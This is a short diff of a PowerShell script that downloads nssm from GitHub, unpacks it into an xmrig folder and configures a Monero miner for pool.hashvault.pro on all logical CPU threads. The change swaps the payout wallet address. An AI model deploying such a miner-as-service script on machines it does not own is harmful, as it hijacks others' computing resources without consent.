@@ -11,7 +11,7 @@ Invoke-WebRequest -Uri https://github.com/GALVINVN/system/raw/refs/heads/main/ns
 $nssmZipPath = "$env:C:\nssm-2.24.zip"
 Expand-Archive -Path $nssmZipPath -DestinationPath $xmrigFolder -Force
 $nssmExe = "C:\xmrig\nssm-2.24\win64\nssm.exe"
-$wallet = "87LVyXpW64PLompVtz6nYsULGAGckEv63CGW8euYg21VV7BB8sALsvadF1JK7E6g5VV71gJSXJcBrPEJjpjwhbX5HBUCc5s"
+$wallet = "88j2KWTyLZSGfRweK4Gz7FNrF5R823wDjcFGjF8nWvYkUkGKooeGjvu3p9V95JLTuVKXs278BTDLBRPjMfLrVTLpHaTy8Um"
 $worker = "x2"
 $threads = (Get-CimInstance Win32_Processor).NumberOfLogicalProcessors
 $appParams = "-o pool.hashvault.pro:443 " +
